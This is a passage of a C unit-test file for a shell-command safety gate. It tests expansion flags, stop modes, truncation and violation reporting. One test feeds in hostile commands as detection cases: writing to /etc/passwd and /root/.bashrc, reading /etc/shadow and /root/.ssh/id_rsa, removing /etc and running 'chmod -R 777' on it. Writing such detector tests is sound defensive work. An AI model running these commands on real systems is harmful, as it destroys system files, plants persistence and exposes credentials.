  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "echo ok; echo >\"$OUT\"", &result));
  ASSERT(result.short_circuited && result.subcommand_count == 1 &&
         result.subcommands[0].unresolved_expansion_flags == 0 &&
         result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT(eval_with_prefix(gate, "echo \"$DATA\" >\"$OUT\"", 16, &result) ==
         SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_PATH));
  ASSERT(result.subcommand_count == 1 &&
         result.subcommands[0].unresolved_expansion_flags ==
             (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH) &&
         result.unresolved_expansion_flags ==
             result.subcommands[0].unresolved_expansion_flags);
  for (uint32_t i = 0; i < result.subcommand_count; i++)
    ASSERT((result.subcommands[i].unresolved_expansion_flags &
            ~result.unresolved_expansion_flags) == 0);
  sg_gate_free(gate);
}

TEST(expansion_flags_stop_modes) {
  static const struct {
    sg_stop_mode_t mode;
    const char *first;
  } stops[] = {{SG_STOP_FIRST_FAIL, "echo missing"},
               {SG_STOP_FIRST_PASS, "echo ok"},
               {SG_STOP_FIRST_ALLOW, "echo ok"},
               {SG_STOP_FIRST_DENY, "echo denied"}};
  static const struct {
    const char *tail;
    uint32_t flags;
  } tails[] = {
      {"echo \"$DATA\"", SG_EXPANSION_UNRESOLVED_ARGV},
      {"echo >\"$OUT\"", SG_EXPANSION_UNRESOLVED_PATH},
      {"echo \"$DATA\" >\"$OUT\"",
       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
      {"{ { echo \"$DATA\"; }; echo plain; } >\"$OUT\"",
       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo ok", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "echo denied", false));
  for (size_t si = 0; si < sizeof(stops) / sizeof(stops[0]); si++) {
    for (size_t ti = 0; ti < sizeof(tails) / sizeof(tails[0]); ti++) {
      char source[256];
      int length = snprintf(source, sizeof(source), "%s; %s", stops[si].first,
                            tails[ti].tail);
      ASSERT(length > 0 && (size_t)length < sizeof(source));
      ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
      shellsplit_test_source_scan_reset();
      sg_result_t full = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &full));
      ASSERT(!full.short_circuited && full.subcommand_count >= 2 &&
             full.unresolved_expansion_flags == tails[ti].flags &&
             full.subcommands[0].unresolved_expansion_flags == 0);
      ASSERT(full.subcommands[1].unresolved_expansion_flags == tails[ti].flags);
      if (ti == 3)
        ASSERT(full.subcommand_count == 3 &&
               full.subcommands[2].unresolved_expansion_flags ==
                   SG_EXPANSION_UNRESOLVED_PATH);
      size_t full_work =
          shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS);
      ASSERT_SG_OK(sg_gate_set_stop_mode(gate, stops[si].mode));
      sg_result_t stopped = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &stopped));
      ASSERT(stopped.short_circuited && stopped.subcommand_count == 1 &&
             stopped.unresolved_expansion_flags ==
                 full.unresolved_expansion_flags &&
             stopped.subcommands[0].unresolved_expansion_flags == 0 &&
             stopped.subcommands[0].verdict == full.subcommands[0].verdict);
      ASSERT(shellsplit_test_metadata_work(
                 SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS) == 2 * full_work);
      shellsplit_test_source_scan_reset();
    }
  }
  sg_gate_free(gate);
}

TEST(expansion_flags_precede_output_failures) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result = {0};
  const uint32_t both =
      SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH;
  ASSERT(eval_with_prefix(gate, "echo ok; echo \"$DATA\" >\"$OUT\"", 8,
                          &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 1 &&
         result.subcommands[0].unresolved_expansion_flags == 0 &&
         result.unresolved_expansion_flags == both);

  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/etc";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT(eval_with_prefix(gate, "echo > /etc/private; echo \"$DATA\" >\"$OUT\"",
                          8, &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.violation_truncated &&
         result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 0 &&
         result.unresolved_expansion_flags == both);
  sg_gate_free(gate);
}

TEST(expansion_flags_resolved_values) {
  static const char binary[] = "3:a\0b,";
  static const struct expansion_view values[] = {
      {"", 0}, {"0:,", 3}, {"3:hit,", 6}, {binary, sizeof(binary) - 1}};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo ok", false));
  for (size_t i = 0; i < sizeof(values) / sizeof(values[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_requested_length,
                                                 (void *)&values[i]));
    static const sg_stop_mode_t modes[] = {SG_EVAL_ALL, SG_STOP_FIRST_ALLOW};
    for (size_t mi = 0; mi < sizeof(modes) / sizeof(modes[0]); mi++) {
      ASSERT_SG_OK(sg_gate_set_stop_mode(gate, modes[mi]));
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, "echo ok; echo \"$DATA\"", &result));
      ASSERT(result.unresolved_expansion_flags == 0);
      for (uint32_t ci = 0; ci < result.subcommand_count; ci++)
        ASSERT(result.subcommands[ci].unresolved_expansion_flags == 0);
    }
    /* A dynamic command name is protected even with a configured resolver. */
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, "echo ok; \"$COMMAND\"", &result));
    ASSERT(result.short_circuited && result.subcommand_count == 1 &&
           result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_ARGV);
  }
  sg_gate_free(gate);
}

TEST(expansion_flags_linear_metadata) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  size_t previous = 0;
  for (unsigned count = 4; count <= 32; count *= 2) {
    char source[2048];
    size_t used = 0;
    for (unsigned i = 0; i < count; i++) {
      int written = snprintf(source + used, sizeof(source) - used,
                             "echo \"$DATA\" >\"$OUT\"; ");
      ASSERT(written > 0 && (size_t)written < sizeof(source) - used);
      used += (size_t)written;
    }
    shellsplit_test_source_scan_reset();
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    ASSERT(result.subcommand_count == count &&
           result.unresolved_expansion_flags ==
               (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH));
    size_t work =
        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS);
    ASSERT(work > 0 && work <= 16 * count &&
           (!previous || work <= 2 * previous + 1));
    previous = work;
  }
  sg_gate_free(gate);
}

typedef struct {
  shell_expand_status_t leaf_status;
  bool empty_redirect;
  bool empty_file_parent;
  bool valid;
  size_t leaf_calls;
  size_t calls;
} nested_path_expansion_t;

static SHELL_NONNULL(1, 2, 3, 4) shell_expand_status_t
    expand_nested_path(const shell_expand_word_request_t *request,
                       const char **netargv, size_t *length, void *context) {
  nested_path_expansion_t *state = context;
  state->calls++;
  state->valid &=
      request->word_offset <= request->source_length &&
      request->word_length <= request->source_length - request->word_offset &&
      request->owner_offset <= request->source_length &&
      request->owner_length <= request->source_length - request->owner_offset;
  static const char leaf[] = "\"$FILE\"";
  bool is_leaf = request->word_length == sizeof(leaf) - 1 &&
                 memcmp(request->source + request->word_offset, leaf,
                        sizeof(leaf) - 1) == 0;
  if (is_leaf) {
    state->leaf_calls++;
    state->valid &=
        request->purpose == SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH;
    if (state->leaf_status == SHELL_EXPAND_UNRESOLVED)
      return SHELL_EXPAND_UNRESOLVED;
  }
  bool empty = (state->empty_redirect &&
                request->purpose == SHELL_EXPAND_WORD_REDIRECT_PATH) ||
               (state->empty_file_parent && !is_leaf &&
                request->purpose == SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH);
  *netargv = empty ? "" : "8:/tmp/out,";
  *length = empty ? 0 : 11;
  return SHELL_EXPAND_RESOLVED;
}

TEST(nested_path_expansion_ownership) {
  static const struct {
    const char *source;
    unsigned commands;
    unsigned owners;
    unsigned leaves;
  } cases[] = {
      {"echo >\"$(<\"$FILE\")\"", 1, 1, 1},
      {"echo <\"$(<\"$FILE\")\"", 1, 1, 1},
      {"echo >>\"$(<\"$FILE\")\"", 1, 1, 1},
      {"echo <>\"$(<\"$FILE\")\"", 1, 1, 1},
      {"exec {fd}>\"$(<\"$FILE\")\"", 1, 1, 1},
      {"echo >\"$(<\"$(<\"$FILE\")\")\"", 1, 1, 1},
      {"echo \"$(<\"$FILE\")\"", 1, 1, 1},
      {"NAME=\"$(<\"$FILE\")\" echo", 1, 1, 1},
      {"{ echo one; echo two; } >\"$(<\"$FILE\")\"", 2, 3, 1},
      {"{ { echo one; }; echo two; } >\"$(<\"$FILE\")\"", 2, 3, 1},
      {"echo >\"$(<\"$FILE\")\"; echo plain", 2, 1, 1},
      {"echo \"$(echo >\"$(<\"$FILE\")\")\"", 2, 2, 1},
      {"echo > >(echo >\"$(<\"$FILE\")\") >out", 2, 2, 1},
      {"echo < <(echo >\"$(<\"$FILE\")\")", 2, 2, 1},
      {"echo ok; >\"$(<\"$FILE\")\"", 1, 0, 1},
      {"false && echo >\"$(<\"$FILE\")\"", 2, 0, 0},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    for (unsigned resolved = 0; resolved < 2; resolved++) {
      nested_path_expansion_t state = {.leaf_status =
                                           resolved ? SHELL_EXPAND_RESOLVED
                                                    : SHELL_EXPAND_UNRESOLVED,
                                       .valid = true};
      ASSERT_SG_OK(
          sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
      uint32_t expected =
          !resolved && cases[i].leaves ? SG_EXPANSION_UNRESOLVED_PATH : 0;
      if (result.unresolved_expansion_flags != expected)
        printf("\n    nested path case %zu: flags=%u expected=%u\n", i,
               result.unresolved_expansion_flags, expected);
      ASSERT(state.valid && state.leaf_calls == cases[i].leaves &&
             result.subcommand_count == cases[i].commands &&
             result.unresolved_expansion_flags == expected);
      for (unsigned ci = 0; ci < cases[i].commands; ci++) {
        uint32_t owner_flag = !resolved && (cases[i].owners & (1u << ci))
                                  ? SG_EXPANSION_UNRESOLVED_PATH
                                  : 0;
        ASSERT(result.subcommands[ci].unresolved_expansion_flags == owner_flag);
      }
    }
  }
  /* A known failed open does not undo nested pathname expansions already
   * reached while producing that operand. */
  for (unsigned failed_parent = 0; failed_parent < 2; failed_parent++) {
    nested_path_expansion_t state = {.leaf_status = SHELL_EXPAND_UNRESOLVED,
                                     .empty_redirect = !failed_parent,
                                     .empty_file_parent = failed_parent,
                                     .valid = true};
    ASSERT_SG_OK(
        sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, "echo >\"$(<\"$(<\"$FILE\")\")\"", &result));
    ASSERT(state.valid && state.leaf_calls == 1 &&
           result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH &&
           result.subcommands[0].unresolved_expansion_flags ==
               SG_EXPANSION_UNRESOLVED_PATH);
  }
  sg_gate_free(gate);
}

TEST(nested_path_expansion_stop_and_truncation) {
  static const struct {
    sg_stop_mode_t mode;
    const char *first;
  } stops[] = {{SG_STOP_FIRST_FAIL, "echo missing"},
               {SG_STOP_FIRST_PASS, "echo ok"},
               {SG_STOP_FIRST_ALLOW, "echo ok"},
               {SG_STOP_FIRST_DENY, "echo denied"}};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo ok", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "echo denied", false));
  nested_path_expansion_t state = {.leaf_status = SHELL_EXPAND_UNRESOLVED,
                                   .valid = true};
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
  for (size_t i = 0; i < sizeof(stops) / sizeof(stops[0]); i++) {
    char source[128];
    snprintf(source, sizeof(source),
             "%s; { echo one; echo two; } "
             ">\"$(<\"$FILE\")\"",
             stops[i].first);
    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, stops[i].mode));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    ASSERT(state.valid && result.short_circuited &&
           result.subcommand_count == 1 &&
           result.subcommands[0].unresolved_expansion_flags == 0 &&
           result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
  }
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result = {0};
  ASSERT(eval_with_prefix(gate, "echo ok; echo >\"$(<\"$FILE\")\"", 8,
                          &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
         result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
  sg_gate_free(gate);
}

TEST(nested_path_expansion_linear_metadata) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  size_t previous = 0;
  /* Each command retains three documents; 32 rows already fill all 128
   * non-boundary nodes. Keep scaling below the documented total-node bound. */
  for (unsigned count = 4; count <= 16; count *= 2) {
    char source[2048];
    size_t used = 0;
    for (unsigned i = 0; i < count; i++) {
      int written = snprintf(source + used, sizeof(source) - used,
                             "echo >\"$(<\"$(<\"$FILE\")\")\"; ");
      ASSERT(written > 0 && (size_t)written < sizeof(source) - used);
      used += (size_t)written;
    }
    nested_path_expansion_t state = {.leaf_status = SHELL_EXPAND_UNRESOLVED,
                                     .valid = true};
    ASSERT_SG_OK(
        sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
    shellsplit_test_source_scan_reset();
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    size_t work =
        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS);
    ASSERT(state.valid && state.leaf_calls == count &&
           result.subcommand_count == count && work <= 16 * count &&
           (!previous || work <= 2 * previous + 1));
    ASSERT(result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
    previous = work;
  }
  shellsplit_test_source_scan_reset();
  sg_gate_free(gate);
}

TEST(expansion_path_failure_and_reachability_contract) {
  static const struct {
    const char *netargv;
  } failures[] = {{""}, {"0:,"}, {"1:a,1:b,"}};
  for (size_t i = 0; i < sizeof(failures) / sizeof(failures[0]); i++) {
    expansion_rule_t rules[] = {
        {"\"$FAIL\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
         failures[i].netargv, 0},
        {"\"$SAME\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
         "9:/etc/same,", 0},
        {"\"$LATER\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
         "10:/etc/later,", 0},
    };
    expansion_contract_t contract = {
        .rules = rules,
        .rule_count = sizeof(rules) / sizeof(rules[0]),
        .valid = true,
    };
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(
        gate, "echo first >\"$FAIL\" >\"$SAME\" && echo second >\"$LATER\"",
        &result));
    if (!contract.valid || contract.calls != 1)
      printf("\n    failure case %zu: valid=%d calls=%zu rules=%zu/%zu/%zu\n",
             i, contract.valid, contract.calls, rules[0].calls, rules[1].calls,
             rules[2].calls);
    ASSERT(contract.valid && contract.calls == 1);
    ASSERT(rules[0].calls == 1 && rules[1].calls == 0 && rules[2].calls == 0);
    ASSERT(result.subcommand_count == 2 && !result.truncated);
    sg_gate_free(gate);
  }

  expansion_rule_t group_rules[] = {
      {"\"$FAIL\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED, "",
       0},
      {"\"$BODY\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED, "3:hit,",
       0},
      {"\"$LATER\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
       "10:/etc/later,", 0},
  };
  expansion_contract_t group_contract = {
      .rules = group_rules,
      .rule_count = sizeof(group_rules) / sizeof(group_rules[0]),
      .valid = true,
  };
  sg_gate_t *group_gate = sg_gate_new();
  ASSERT(group_gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(group_gate, 0));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
      group_gate, expand_by_source_word, &group_contract));
  sg_result_t group_result = {0};
  ASSERT_SG_OK(eval_cmd(group_gate,
                        "{ echo \"$BODY\"; } >\"$FAIL\" && "
                        "echo later >\"$LATER\"",
                        &group_result));
  ASSERT(group_contract.valid && group_contract.calls == 1);
  ASSERT(group_rules[0].calls == 1 && group_rules[1].calls == 0 &&
         group_rules[2].calls == 0);
  sg_gate_free(group_gate);

  expansion_rule_t never_rule = {"\"$NEVER\"", SHELL_EXPAND_WORD_REDIRECT_PATH,
                                 SHELL_EXPAND_RESOLVED, "10:/etc/never,", 0};
  expansion_contract_t never = {
      .rules = &never_rule,
      .rule_count = 1,
      .valid = true,
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &never));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "false && echo x >\"$NEVER\"", &result));
  ASSERT(never.valid && never.calls == 0 && never_rule.calls == 0);
  sg_gate_free(gate);

  expansion_rule_t unresolved_rule = {"\"$OUT\"",
                                      SHELL_EXPAND_WORD_REDIRECT_PATH,
                                      SHELL_EXPAND_UNRESOLVED, NULL, 0};
  expansion_contract_t unresolved = {
      .rules = &unresolved_rule,
      .rule_count = 1,
      .valid = true,
  };
  gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                               &unresolved));
  ASSERT_SG_OK(eval_cmd(gate, ">\"$OUT\"", &result));
  ASSERT(unresolved.valid && unresolved.calls == 1 &&
         result.subcommand_count == 0 &&
         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_PATH) !=
             0);
  sg_gate_free(gate);
}

typedef struct {
  const char *path_record;
  size_t path_length;
  unsigned argument_calls;
  bool cwd_valid;
} substitution_status_fixture_t;

static SHELL_NONNULL(1, 2, 3, 4) shell_expand_status_t
    expand_substitution_status(const shell_expand_word_request_t *request,
                               const char **netargv, size_t *length,
                               void *context) {
  substitution_status_fixture_t *fixture = context;
  const char *word = request->source + request->word_offset;
  if (request->word_length == 6 && memcmp(word, "\"$ARG\"", 6) == 0) {
    fixture->argument_calls++;
    fixture->cwd_valid &= request->cwd_known && request->cwd_absolute &&
                          strcmp(request->cwd, "/workspace") == 0;
    *netargv = "3:hit,";
    *length = 6;
    return SHELL_EXPAND_RESOLVED;
  }
  if (request->word_length == 7 && memcmp(word, "\"$PATH\"", 7) == 0) {
    *netargv = fixture->path_record;
    *length = fixture->path_length;
    return SHELL_EXPAND_RESOLVED;
  }
  return SHELL_EXPAND_UNRESOLVED;
}

TEST(substitution_status_callback_reachability) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  substitution_status_fixture_t fixture = {.cwd_valid = true};
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_substitution_status,
                                               &fixture));
  for (size_t i = 0;
       i < sizeof(shellsplit_test_substitution_status_cases) /
               sizeof(shellsplit_test_substitution_status_cases[0]);
       i++) {
    for (unsigned success = 0; success < 2; success++) {
      char source[512];
      int length =
          snprintf(source, sizeof(source), "%s %s echo \"$ARG\" >/etc/reached",
                   shellsplit_test_substitution_status_cases[i].source,
                   success ? "&&" : "||");
      ASSERT(length > 0 && (size_t)length < sizeof(source));
      fixture.argument_calls = 0;
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &result));
      bool expected =
          success ? shellsplit_test_substitution_status_cases[i].succeeds
                  : shellsplit_test_substitution_status_cases[i].fails;
      if (fixture.argument_calls != (unsigned)expected)
        printf("\n    status callback: %s calls=%u expected=%d\n", source,
               fixture.argument_calls, expected);
      ASSERT(fixture.argument_calls == (unsigned)expected && fixture.cwd_valid);
      ASSERT(!!(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) ==
             expected);
    }
  }
  fixture.path_record = "0:,";
  fixture.path_length = 3;
  static const char *controls[] = {
      "X=\"$(<\"\")\" && cd /etc; echo \"$ARG\"",
      "X=\"$(<\"$PATH\")\" && cd /etc; echo \"$ARG\"",
      "X=\"$(<\"$PATH\")\" || echo \"$ARG\"",
      "echo \"$(<\"$PATH\")\" \"$ARG\"",
      "X=\"$(false)\" <\"$PATH\" || echo \"$ARG\"",
      "X=\"$(false)\" <\"$PATH\" && cd /etc; echo \"$ARG\"",
      "X=\"$(false)\" {fd}>\"$PATH\" || echo \"$ARG\"",
      "3<<<\"${MAYBE:?}\" 0>&0 || echo \"$ARG\"",
  };
  for (size_t i = 0; i < sizeof(controls) / sizeof(controls[0]); i++) {
    fixture.argument_calls = 0;
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, controls[i], &result));
    ASSERT(fixture.argument_calls == 1 && fixture.cwd_valid);
  }
  sg_gate_free(gate);
}

TEST(resolved_file_violation_details) {
  static const struct {
    const char *source, *path;
    uint32_t type;
  } cases[] = {
      {"echo >\"$PATH\"", "/etc/passwd", SG_VIOL_WRITE_SENSITIVE},
      {"echo >\"$PATH\"", "/root/.bashrc", SG_VIOL_PERSISTENCE},
      {"echo \"$(<\"$PATH\")\"", "/etc/shadow", SG_VIOL_SUBST_SENSITIVE},
      {"rm \"$PATH\"", "/etc", SG_VIOL_REMOVE_SYSTEM},
      {"chmod -R 777 \"$PATH\"", "/etc", SG_VIOL_PERM_SYSTEM},
      {"echo >\"$PATH\"; cat \"$PATH\"", "/tmp/matched",
       SG_VIOL_WRITE_THEN_READ},
      {"sudo echo >\"$PATH\"", "/tmp/out", SG_VIOL_SUDO_REDIRECT},
      {"cat \"$PATH\"", "/root/.ssh/id_rsa", SG_VIOL_READ_SECRETS},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  char record[256];
  substitution_status_fixture_t fixture = {.path_record = record};
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_substitution_status,
                                               &fixture));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    int length = snprintf(record, sizeof(record), "%zu:%s,",
                          strlen(cases[i].path), cases[i].path);
    ASSERT(length > 0 && (size_t)length < sizeof(record));
    fixture.path_length = (size_t)length;
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    memset(record, 'x',
           sizeof(record)); /* Callback storage expires after eval. */
    char expected[256];
    snprintf(expected, sizeof(expected),
             "resolved \"%s\" (source \"\\\"$PATH\\\"\")", cases[i].path);
    bool found = false;
    for (uint32_t violation = 0; violation < result.violation_count;
         violation++)
      if (result.violations[violation].type == cases[i].type) {
        ASSERT_STR(result.violations[violation].detail, expected);
        found = true;
      }
    if (!found)
      printf("\n    missing resolved detail: %s type=%u flags=%u\n",
             cases[i].source, cases[i].type, result.violation_type_flags);
    ASSERT(found);
  }
  static const char special[] = "/etc/a\n\"\\\377";
  ASSERT(shell_netstring_write(record, sizeof(record), special,
                               sizeof(special) - 1,
                               &fixture.path_length) == SHELL_NETSTRING_OK);
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "echo >\"$PATH\"", &result));
  ASSERT(result.violation_count > 0);
  ASSERT_STR(
      result.violations[0].detail,
      "resolved \"/etc/a\\x0A\\\"\\\\\\xFF\" (source \"\\\"$PATH\\\"\")");
  static const char source[] = "echo >\"$PATH\"";
  size_t workspace = sg_test_eval_workspace_size(sizeof(source) - 1);
  size_t alignment = shell_dep_workspace_alignment();
  char *storage = malloc(workspace + 256 + alignment - 1);
  ASSERT(storage != NULL);
  bool clipped_detail = false, completed = false;
  for (size_t prefix = 1; prefix <= 256; prefix++) {
    char *buffer = sg_test_eval_buffer_for_prefix(storage, prefix);
    sg_error_t error = sg_gate_evaluate(gate, source, sizeof(source) - 1,
                                        buffer, workspace + prefix, &result);
    ASSERT(error == SG_OK || error == SG_ERR_TRUNC);
    ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
    if (error == SG_ERR_TRUNC) {
      ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
      clipped_detail |=
          result.violation_count != 0 && result.violations[0].detail != NULL;
    } else
      completed = true;
  }
  ASSERT(clipped_detail && completed);
  free(storage);
  ASSERT_SG_OK(eval_cmd(gate, "echo >/etc/passwd", &result));
  ASSERT(result.violation_count > 0);
  ASSERT_STR(result.violations[0].detail, "/etc/passwd");
  sg_gate_free(gate);
}

typedef struct {
  const char *value;
  unsigned calls;
} file_diagnostic_fixture_t;

static shell_expand_status_t
expand_file_diagnostic(const shell_expand_word_request_t *request,
                       const char **netargv, size_t *length, void *context) {
  file_diagnostic_fixture_t *fixture = context;
  if (request->purpose != SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH)
    return SHELL_EXPAND_UNRESOLVED;
  fixture->calls++;
  *netargv = fixture->value;
  *length = strlen(fixture->value);
  return SHELL_EXPAND_RESOLVED;
}

TEST(file_substitution_diagnostic_receiver) {
  static const struct {
    const char *source, *value;
    bool outer_inspection;
  } cases[] = {
      {"sh -c \"$(exec 2>&1; x=$(<\"$FILE\"))\"", "0:,", true},
      {"sh -c \"$(exec 2>&1; x=$(<\"$@\"))\"", "", true},
      {"sh -c \"$(exec 2>&1; x=$(<\"$@\"))\"", "1:a,1:b,", true},
      {"sh -c \"$(exec 2>&1; x=$(<\"$FILE\"))\"", "10:/tmp/input,", true},
      {"sh -c \"$(x=$(<\"$FILE\"))\"", "10:/tmp/input,", false},
      {"sh -c \"$(exec 2>&-; x=$(<\"$FILE\"))\"", "0:,", false},
      {"sh -c \"$(exec 2<input; x=$(<\"$FILE\"))\"", "0:,", false},
      {"sh -c \"$(exec 2>&1; x=$(<\"$FILE\") 1>&- 2>&-)\"", "0:,", true},
      {"sh -c \"$(x=$(<\"$FILE\") 2>&1)\"", "0:,", false},
